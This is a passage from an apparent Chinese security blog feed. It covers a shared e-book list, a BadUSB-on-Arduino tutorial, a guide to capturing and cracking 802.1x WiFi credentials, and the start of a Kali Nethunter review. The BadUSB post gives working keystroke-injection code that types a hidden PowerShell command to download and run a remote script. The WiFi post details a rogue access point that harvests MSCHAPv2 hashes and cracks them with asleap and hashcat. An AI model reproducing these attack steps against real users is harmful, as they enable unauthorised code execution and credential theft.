    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h1><p>包括了Linux、Web安全、android安全、计算机架构、编程语言（主要是Python）方面的图书</p><h1 id="List"><a href="#List" class="headerlink" title="List"></a>List</h1><ul><li>(CS6233) Stallings - Operating Systems Internals and Design Principles 6e.pdf</li><li>Android软件安全与逆向分析.pdf</li><li>Black Hat Python, Python Programming for Hackers.pdf</li><li>C Primer Plus, 6th Edition.pdf</li><li>C++ Primer, 5th Edition.pdf</li><li>computer organization and design, 4th ed, d. a. patterson and j. l. hennessy.pdf</li><li>COMPUTER SECURITY HANDBOOK I.zip</li><li>COMPUTER SECURITY HANDBOOK II.zip</li><li>Database System Concepts 6e By Abraham Silberschatz, Henry Korth and S Sudarshan.pdf</li><li>Gray Hat Hacking, Third Edition.pdf</li><li>Hacking Exposed 7 Network Security Secre - Stuart McClure.pdf</li><li>Hacking Exposed wireless.pdf</li><li>hacking-the-art-of-exploitation.pdf</li><li>Head First HTML and CSS 2nd Edition.pdf</li><li>Head First PHP-MySQL- ebooksfeed.com.pdf</li><li>Introduction to algorithms.pdf</li><li>Learn Python The Hard Way 3rd Edition V413HAV.pdf</li><li>Linux Command Line and Shell Scripting Bible, 2nd Edition.pdf</li><li>Linux® Bible.zip</li><li>Linux® Server Security.zip</li><li>Network Attacks &amp; Exploitation A Framework. Matthew Monte .zip</li><li>The Antivirus Hacker’s Handbook.zip</li><li>The Mobile Application  Hacker’s Handbook.zip<br>T- he Network Security Test Lab A Step-by-Step Guide .zip</li><li>Violent Python - A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers.pdf</li><li>[Python核心编程(第2版)].(Core.Python.Programming).Wesley.Chun.文字版.pdf</li><li>鸟哥的Linux私房菜基础篇-第三版.pdf</li></ul><h1 id="神秘代码"><a href="#神秘代码" class="headerlink" title="神秘代码"></a>神秘代码</h1><font size="4">Resilio Sync</font><font color="red" size="4">BI6MHBBYZCH2IXVCO2HYG4BYBQADUVEKV</font><p>注：并不是每一本我都看过！但是我了解并计划看其中的绝大多数</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="学习" scheme="https://nonconformist.me/tags/%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="书籍" scheme="https://nonconformist.me/tags/%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>低成本安全硬件（一）——BadUSB on Arduino</title>
    <link href="https://nonconformist.me/lowcost-badUSB/"/>
    <id>https://nonconformist.me/lowcost-badUSB/</id>
    <published>2017-02-21T12:04:01.000Z</published>
    <updated>2017-02-22T11:54:54.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>鉴于硬件安全对于大多数新人是较少接触的，而这方面又非常吸引我，但是部分专业安全研究设备较高的价格使人望而却步。在该系列中，笔者希望对此感兴趣的读者在花费较少金钱的情况下体会到硬件安全的魅力所在。本系列计划分成四个部分：BadUSB on Arduino; RFID on PN532; GSM on Motorola C118 ; SDR on RTL2832U(电视棒)。</p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>BadUSB早在2014年底的PacSec会议上便已经提出，这是USB协议中的一个漏洞————USB设备可以伪装成为其他任何设备，例如输入设备、网卡等等。这个漏洞目前还没有得到修复，几乎可以说在有合适的脚本的情况下，只要能够插进去，没有什么是黑不掉的！</p><h3 id="2014年的PPT参考如下："><a href="#2014年的PPT参考如下：" class="headerlink" title="2014年的PPT参考如下："></a>2014年的PPT参考如下：</h3><p><a href="https://srlabs.de/wp-content/uploads/2014/11/SRLabs-BadUSB-Pacsec-v2.pdf" target="_blank" rel="noopener">https://srlabs.de/wp-content/uploads/2014/11/SRLabs-BadUSB-Pacsec-v2.pdf</a></p><h1 id="常见硬件介绍"><a href="#常见硬件介绍" class="headerlink" title="常见硬件介绍"></a>常见硬件介绍</h1><h2 id="Psychson"><a href="#Psychson" class="headerlink" title="Psychson"></a>Psychson</h2><p>事实上这是Github上的一个开源项目，由于世面上的部分U盘的芯片可以Hack，所以通过比较Geek的方式可以让U盘实现BadUSB的功能。但是项目已经两年没有更新过了，支持的许多硬件也已经停产或者更换了新的主控芯片，笔者也尝试着使用之但是失败了。</p><p>伪装性：★★★★★</p><p>易开发：★★</p><p>社区支持：★★</p><h3 id="项目主页："><a href="#项目主页：" class="headerlink" title="项目主页："></a>项目主页：</h3><p><a href="https://github.com/brandonlw/Psychson" target="_blank" rel="noopener">https://github.com/brandonlw/Psychson</a></p><h2 id="Rubber-Ducky"><a href="#Rubber-Ducky" class="headerlink" title="Rubber Ducky"></a>Rubber Ducky</h2><img src="/lowcost-badUSB/rubber_ducky.jpg" title="[Rubber Ducky 结构图]"><p>中文名橡皮鸭，外观酷（就）似（是）普通的U盘，但是却藏着一颗蔫坏的芯。其结构如图，特点在于可以拆卸并且使用SD卡，可以随时更换Payload，而且十分容易伪装！以至于美剧 《Mr. Robot》里的主角用该设备成功引起了警察的注意（并黑掉了他。但是Hak5上的Rubber Ducky 需要45美刀，这无疑是笔者承受不起的！况且其配送地区还Ban了中国！不过其项目中的脚本还是很值得我们去参考学习的！</p><p>伪装性：★★★★</p><p>易开发：★★★☆</p><p>社区支持：★★★★</p><h3 id="Hak5链接："><a href="#Hak5链接：" class="headerlink" title="Hak5链接："></a>Hak5链接：</h3><p><a href="https://hakshop.com/products/usb-rubber-ducky-deluxe" target="_blank" rel="noopener">https://hakshop.com/products/usb-rubber-ducky-deluxe</a></p><h3 id="官方Payloads"><a href="#官方Payloads" class="headerlink" title="官方Payloads"></a>官方Payloads</h3><p><a href="https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads" target="_blank" rel="noopener">https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads</a></p><h2 id="Teensy-USB"><a href="#Teensy-USB" class="headerlink" title="Teensy USB"></a>Teensy USB</h2><img src="/lowcost-badUSB/teensy.PNG" title="[Teensy USB]"><p>一款USB微控制器开发板，想必便可以当作键盘鼠标来用啦！可以看到部分款式也有插存储卡的地方，价格总体上也达到了Rubber Ducky的一半，但是美刀对于我们而言还是略贵的！</p><p>伪装性：★★</p><p>易开发：★★★</p><p>社区支持：★★★</p><h1 id="Arduino-Leonardo"><a href="#Arduino-Leonardo" class="headerlink" title="Arduino Leonardo"></a>Arduino Leonardo</h1><p>这才是我们今天的主角，其以20-40RMB的售价成为了穷黑客的（我）的首选！而且Arduino的编程对初学者也相当的友好。 笔者的芯片如图：<br><img src="/lowcost-badUSB/my_device.jpg" title="[我的Arduino Leonardo]"></p><p>首先，我们需要对Arduino进行设置，更改“串口”和“开发板”选项：<br><img src="/lowcost-badUSB/arduino_ide_setting.png" title="[Arduino IDE settings]"></p><p>下面开始编写Payload。事实上Payload就是通过键盘来执行一系列的指令来达到某些目的，比如植入后门，反弹shell等。我们需要以此为思路进行程序的编写。</p><h2 id="启动方式"><a href="#启动方式" class="headerlink" title="启动方式"></a>启动方式</h2><p>程序的大致结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;Keyboard.h&gt;</span><br><span class="line"></span><br><span class="line">void setup() &#123;</span><br><span class="line">  //Payload</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void loop() &#123;</span><br><span class="line">  //none</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用到了一个Keyboard库定义了按键，键盘上一些无法输入的按键需要查看定义的名称，其库文件在github上也可以看到：<br><a href="https://github.com/arduino-libraries/Keyboard/blob/master/src/Keyboard.h" target="_blank" rel="noopener">https://github.com/arduino-libraries/Keyboard/blob/master/src/Keyboard.h</a></p><p>其中对我们有用的只有setup，即板子上电，也就是插入的瞬间便开始执行的部分，loop部分留空。</p><p>笔者本人用的windos系统，这里仅讨论windos。若要在windows下仅仅通过键盘执行一段脚本或程序，最经典的方式就是Ctrl+R了。在windos8及以上的操作系统中Win键+S之后，输入powershell或cmd，之后再按回车也可以开始写命令。</p><p>代码如下，蛋疼的地方在于中文的输入法可以很大程度上避免被BadUSB攻击，但是我们在脚本中也可以利用默认的一些快捷键切换到英文输入法。再加上Windows系统不区分大小写，从某些程度上讲只用到大写锁定键足矣。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">delay(1000);</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.press(&apos;r&apos;);</span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line">delay(500);</span><br><span class="line"></span><br><span class="line">//针对shift+ctrl切换输入法</span><br><span class="line">Keyboard.press(KEY_LEFT_SHIFT);</span><br><span class="line">Keyboard.press(KEY_LEFT_CTRL);</span><br><span class="line"></span><br><span class="line">//针对win8及以上部分操作系统改换中文输入</span><br><span class="line">Keyboard.press(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.println(&apos; &apos;);</span><br><span class="line"></span><br><span class="line">//某些输入法的中英文切换</span><br><span class="line">Keyboard.press(KEY_LEFT_SHIFT);</span><br><span class="line"></span><br><span class="line">//暴力直接切换成英文</span><br><span class="line">Keyboard.press(KEY_CAPS_LOCK)</span><br><span class="line"></span><br><span class="line">//手动释放按键</span><br><span class="line">Keyboard.releaseAll();</span><br></pre></td></tr></table></figure></p><h2 id="powershell的各种姿势"><a href="#powershell的各种姿势" class="headerlink" title="powershell的各种姿势"></a>powershell的各种姿势</h2><p>既然“运行”对话框已经打开，下一步需要做的便是执行代码了。在这里我们需要用到一些powershell启动的高级姿势。</p><h3 id="启动选项"><a href="#启动选项" class="headerlink" title="启动选项"></a>启动选项</h3><p>在cmd或者powershell中输入”powershell -?”便可以得到所有的启动选项，这里我们主要关注其中的两个：ExecutionPolicy和WindowStyle。由于powershell的默认ExecutionPolicy是RemoteSigned。即下载脚本必须可信，换句话说就是用户脚本不能执行。所以我们需要设置该字段为Unrestricted或者Bypass。而WindowStyle设置为Hidden时可以隐藏窗口执行，这对隐蔽性很有帮助。</p><p>例如，我们可以在运行中输入：<br><figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -executionpolicy bypass -windowstyle hidden ping www.baidu.com  &gt; d:\test.txt</span><br></pre></td></tr></table></figure></p><p>可以看到test.txt内容如下：<br><blockquote><p>正在 Ping <a href="http://www.a.shifen.com" target="_blank" rel="noopener">www.a.shifen.com</a> [119.75.218.70] 具有 32 字节的数据:<br>来自 119.75.218.70 的回复: 字节=32 时间=23ms TTL=53<br>来自 119.75.218.70 的回复: 字节=32 时间=23ms TTL=53<br>来自 119.75.218.70 的回复: 字节=32 时间=24ms TTL=53<br>来自 119.75.218.70 的回复: 字节=32 时间=23ms TTL=53</p><p>119.75.218.70 的 Ping 统计信息:<br>    数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，<br>往返行程的估计时间(以毫秒为单位):<br>    最短 = 23ms，最长 = 24ms，平均 = 23ms</p><footer><strong>[test.txt]</strong></footer></blockquote></p><p>除此之外，还可以直接从base64编码执行，这样可以直接bypass antivirus software。这是一种更为强大的运行姿势。</p><h3 id="远程执行"><a href="#远程执行" class="headerlink" title="远程执行"></a>远程执行</h3><p>事实上，bypass的目的真正是为了执行来自远程服务器的脚本。这里有一个用法：<br><figure class="highlight ps"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ExecutionPolicy Bypass IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'http://your.site/file.ps1'</span>);</span><br></pre></td></tr></table></figure><br>这里牵扯到了powershell的强大之处，其可以直接创建对象。上面的意思是从下载一个远程脚本并执行。显然远程脚本相对于把payload写在一行更加优雅，而且更加灵活。最重要的原因还是此arduino开发板的存储空间太小，并不能容纳太长的脚本。</p><p>这里推荐一个powershell的渗透框架：nishang</p><p>项目地址：<a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener">https://github.com/samratashok/nishang</a></p><p>nishang的强大之处在于其几乎可以实现一个后门可以实现的所有。</p><p>据笔者了解，metasploit也支持生产powershell的payload了。</p><p>公网上的powershell脚本可以通过github的raw浏览服务、一些在线的文本存储服务，甚至是用ngrok做一个web服务器的映射来完成临时、隐蔽的发送。</p><h3 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h3><p>后续的代码如下,其中后面的部分是为了处理UAC，即一个弹出用户确认的对话框。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Keyboard.println(&quot;powershell -ExecutionPolicy Bypass IEX (New-Object Net.WebClient).DownloadString(&apos;http://your.site/file.ps1&apos;);&quot;);</span><br><span class="line">Keyboard.press(KEY_LEFT_CTRL);</span><br><span class="line">Keyboard.press(KEY_LEFT_SHIFT);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line">delay(500);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">delay(500);</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line">delay(2500);</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line"></span><br><span class="line">Keyboard.press(KEY_LEFT_ALT);</span><br><span class="line">Keyboard.println(&apos;y&apos;);  </span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line">Keyboard.press(KEY_RETURN);</span><br><span class="line">Keyboard.releaseAll();</span><br><span class="line">delay(1500)</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>Powershell与BadUSB的结合可以在Windows下办到很多事情，BadUSB的渗透方案也不仅仅限于键盘输入，鼠标输入甚至网卡都是可以作为攻击工具。笔者在Kali Nethunter上就见到了将手机作为网卡来嗅探流量的用法。虽然距离漏洞正式发布已经过去了整整两年时间，但是这一漏洞短时间内还将普遍存在于各大操作系统以及USB协议中，更高级的姿势还需要自己去探索！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="硬件安全" scheme="https://nonconformist.me/tags/%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/"/>
    
      <category term="BadUSB" scheme="https://nonconformist.me/tags/BadUSB/"/>
    
      <category term="Arduino" scheme="https://nonconformist.me/tags/Arduino/"/>
    
  </entry>
  
  <entry>
    <title>使用Kali Nethunter破解802.1x安全性WiFi</title>
    <link href="https://nonconformist.me/nethunter-8021x/"/>
    <id>https://nonconformist.me/nethunter-8021x/</id>
    <published>2017-02-10T04:25:57.000Z</published>
    <updated>2017-02-22T09:19:08.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>笔者学校的无线网络采用1x认证方式，所以你懂的。</p><p>之前参考GitHub上的一个项目<a href="https://github.com/OpenSecurityResearch/hostapd-wpe" target="_blank" rel="noopener">https://github.com/OpenSecurityResearch/hostapd-wpe</a>在Kali2.0上部署成功，但是在手机端的情况比较不同，猜测是因为架构有一定区别所导致的，而且该网页上的Hostapd版本比较低，遂继续查找，找到了aircrack-ng的GitHub的某一个页面上展示了Hostapd-wpe的用法<a href="https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe/hostapd-wpe" target="_blank" rel="noopener">https://github.com/aircrack-ng/aircrack-ng/tree/master/patches/wpe/hostapd-wpe</a></p><p>页面上写的比较详细，但是实践中笔者还是踩了不少坑，下面开始：</p><font color="red" size="3">注意，本文在Kali 2.0及以上的版本中应该也适用！但是本人没有测试，还请测试通过的朋友留个言</font><h1 id="依赖"><a href="#依赖" class="headerlink" title="依赖"></a>依赖</h1><ul><li>pkg-config</li><li>libssl 1.0</li><li>libnl3 (and genl)</li><li>sqlite3</li></ul><p>安装依赖：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libssl1.0-dev libnl-genl-3-dev libnl-3-dev pkg-config libsqlite3-dev</span><br></pre></td></tr></table></figure></p><p>由于手机上敲指令过于蛋疼，笔者自己ssh到了手机上，在Kali的应用中可以直接打开SSH服务。</p><p>用ftp或者wget之类的将patch文件下载到手机上，这里笔者的路径是 ~/1x/ ,执行：</p><p>注:补丁文件<a href="https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/patches/wpe/hostapd-wpe/hostapd-wpe.patch" target="_blank" rel="noopener">https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/patches/wpe/hostapd-wpe/hostapd-wpe.patch</a></p><h2 id="下载、编译、安装"><a href="#下载、编译、安装" class="headerlink" title="下载、编译、安装"></a>下载、编译、安装</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span> 下载</span><br><span class="line">wget http://hostap.epitest.fi/releases/hostapd-2.6.tar.gz</span><br><span class="line">tar -zxf hostapd-2.6.tar.gz</span><br><span class="line">cd hostapd-2.6</span><br><span class="line"><span class="meta">#</span> 打补丁</span><br><span class="line">patch -p1 &lt; ../hostapd-wpe.patch</span><br><span class="line">cd hostapd</span><br><span class="line"><span class="meta">#</span> 编译安装</span><br><span class="line">make</span><br><span class="line">make install</span><br><span class="line">make wpe</span><br></pre></td></tr></table></figure><h2 id="制作证书"><a href="#制作证书" class="headerlink" title="制作证书"></a>制作证书</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /etc/hostapd-wpe/certs</span><br><span class="line">./bootstrap</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><p>这里会出现关于gendh命令未找到的错误，原因是openssl将gendh已经换成了dhparam,在该目录下的Makefile中将gendh替换为dhparam即可。</p><h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>请注意在Nethunter中已经预先安装了hostapd，但是那个版本的hostapd是不支持1x的。所以请切换到我们部署的hostapd目录下，运行：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hostapd ./hostapd-wpe.conf</span><br></pre></td></tr></table></figure></p><p>这里的配置文件需要修改，需要修改的地方有：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface=wlan1</span><br><span class="line">ssid=YOUR_SSID</span><br><span class="line">driver=nl80211</span><br><span class="line">hw_mode=g</span><br><span class="line"><span class="meta">#</span>fragm_threshold=-1</span><br><span class="line"><span class="meta">#</span>rts_threshold=-1</span><br><span class="line"><span class="meta">#</span> 以上两行需要添加注释</span><br></pre></td></tr></table></figure></p><p>之后再运行，即可成功。日志的数据为该目录下的hostapd-wpe.log文件，其记载了用户的用户名和MSCHAPv2认证hash值。</p><h1 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h1><p>由于采用MSCHAPv2认证，所以密码并不会明文显示。主要有两种方法，其一是直接用系统中的工具asleep进行破解，举个栗子：</p><h2 id="asleep"><a href="#asleep" class="headerlink" title="asleep"></a>asleep</h2><p>采集到的日志样例：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username: jdslfkjs</span><br><span class="line">challenge: bc:87:6c:48:37:d3:92:6e</span><br><span class="line">response: 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0</span><br></pre></td></tr></table></figure></p><p>执行：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> asleap -C bc:87:6c:48:37:d3:92:6e -R 2d:00:61:59:56:06:02:dd:35:4a:0f:99:c8:6b:e1:fb:a3:04:ca:82:40:92:7c:f0 -W wordlist</span><br><span class="line">asleap 2.2 - actively recover LEAP/PPTP passwords. &lt;jwright@hasborg.com&gt;</span><br><span class="line">hash bytes:        b1ca</span><br><span class="line">NT hash:           e614b958df9df49ec094b8730f0bb1ca</span><br><span class="line">password:          bradtest</span><br></pre></td></tr></table></figure></p><p>其中wordlist需要自己准备</p><h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><p>另一种方法是利用hashcat进行破解，其好处是可以根据掩码实时生产字典爆破而且可以使用GPU+CPU资源进行破解，速度比较科学。</p><p>关于hashcat的获取，请去官方网站<a href="https://hashcat.net/" target="_blank" rel="noopener">https://hashcat.net/</a>下载。</p><h3 id="hashcat-brief-introduction"><a href="#hashcat-brief-introduction" class="headerlink" title="hashcat brief introduction"></a>hashcat brief introduction</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hashcat [选项] ... hash|hashfile|hccapfile [字典|掩码|路径]</span><br><span class="line">-m, --hash-type        /哈希值类型，我们使用5500 NetNTLMv1</span><br><span class="line">-a, --attack-mode      /攻击模式，这里使用3 暴力破解</span><br><span class="line">-d, --opencl-devices   /使用设备，1：CPU 2：GPU 3：FPGA，DSP</span><br><span class="line">-o, --outfile          /输出文件路径-i, --incerment        /掩码破击时使用，设置掩码上下限</span><br></pre></td></tr></table></figure><p>笔者这里使用的参数如下：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hashcat64.exe -d 1 -a 3 -m 5500 -o "output path" -i --increment-min=1 --increment-max=8 -1 ?l "input filepath" ?1?1?1?1?1?1?1?1</span><br></pre></td></tr></table></figure></p><p>其中，-1 ?l 代表定义1号掩码的格式为所有小写字母，参考掩码：</p><h3 id="hashcat-maskcode"><a href="#hashcat-maskcode" class="headerlink" title="hashcat maskcode"></a>hashcat maskcode</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">? | Charset</span><br><span class="line">===+=========</span><br><span class="line">l | abcdefghijklmnopqrstuvwxyz</span><br><span class="line">u | ABCDEFGHIJKLMNOPQRSTUVWXYZ</span><br><span class="line">d | 0123456789</span><br><span class="line">s |  !"#$%&amp;'()*+,-./:;=?@[\]^_`&#123;|&#125;~</span><br><span class="line">a | ?l?u?d?s</span><br><span class="line">b | 0x00 - 0xff</span><br></pre></td></tr></table></figure><p>将之前得到的输出结果按照<br>username::::response:challenge<br>的格式存储在文本文档中，注意去掉hash值中的冒号。运行hashcat</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>为了方便起见，可以将其作为用户定义脚本存储在nethunter的custom command中：<br><img src="/nethunter-8021x/custom_command.jpg" title="[OP3 customcommand]"></p><p>运行截图：<br><img src="/nethunter-8021x/1x_test.jpg" title="[OP3 test1x]"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="黑客手机" scheme="https://nonconformist.me/tags/%E9%BB%91%E5%AE%A2%E6%89%8B%E6%9C%BA/"/>
    
      <category term="Kali" scheme="https://nonconformist.me/tags/Kali/"/>
    
      <category term="无线安全" scheme="https://nonconformist.me/tags/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>一加3 Kali Nethunter初体验</title>
    <link href="https://nonconformist.me/OP3-initial/"/>
    <id>https://nonconformist.me/OP3-initial/</id>
    <published>2017-02-09T06:28:07.000Z</published>
    <updated>2017-02-22T09:19:24.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自从 Kali Nethunter 出世以来笔者就一直关注之，然而其兼容机型实在是有限。恰逢笔者换手机的时候一加3（下简称OP3）上市了，当时 Net Hunter 还没有对OP3的支持，但是已经适配了OP2 和 OP1，讲道理的话应该会继续支持OP3的。</p><p>果不其然，在大概12月的时候 Nethunter 的 github wiki 上支持的设备列表中出现了OP3的身影，我就在1月份刷了一次，接下来简单的说一说。</p><h1 id="刷入"><a href="#刷入" class="headerlink" title="刷入"></a>刷入</h1><p>官方Github：<br><a href="https://github.com/offensive-security/kali-nethunter" target="_blank" rel="noopener">https://github.com/offensive-security/kali-nethunter</a></p><p>笔者曾尝试按官方 Wiki 中的 Build 自行构建，但是失败了。于是换用了官方的 Nightly 构建资源，成功。笔者刷入的是 OOS 3.2.8，在此基础上用TWRP刷入Nethunter的kernel之后再刷入其 generic rolling 的 zi p文件即可。</p><p>官方构建：<br><a href="https://build.nethunter.com/nightly" target="_blank" rel="noopener">https://build.nethunter.com/nightly</a></p><p>之后便可以进入系统，安装 Kali 的 Chroot 即可正常使用。</p><h1 id="Modules"><a href="#Modules" class="headerlink" title="Modules"></a>Modules</h1><p>以下简单介绍下NH包含的功能与软件，在官方页面<a href="https://github.com/offensive-security/kali-nethunter/wiki" target="_blank" rel="noopener">https://github.com/offensive-security/kali-nethunter/wiki</a>上有英文的介绍</p><h2 id="Kali-NetHunter-Application"><a href="#Kali-NetHunter-Application" class="headerlink" title="Kali NetHunter Application"></a>Kali NetHunter Application</h2><ul><li>Home Screen - General information panel, network interfaces and HID device status.</li><li>Kali Chroot Manager - For managing chroot metapackage installations.</li><li>Check App Update - For checking Kali NetHunter Android App updates.</li><li>Kali Services - Start / stop various chrooted services. Enable or disable them at boot time.</li><li>Custom Commands - Add your own custom commands and functions to the launcher.</li><li>MAC Changer - Change your Wi-Fi MAC address (only on certain devices)</li><li>VNC Manager - Set up an instant VNC session with your Kali chroot.</li><li>HID Attacks - Various HID attacks, Teensy style.</li><li>DuckHunter HID - 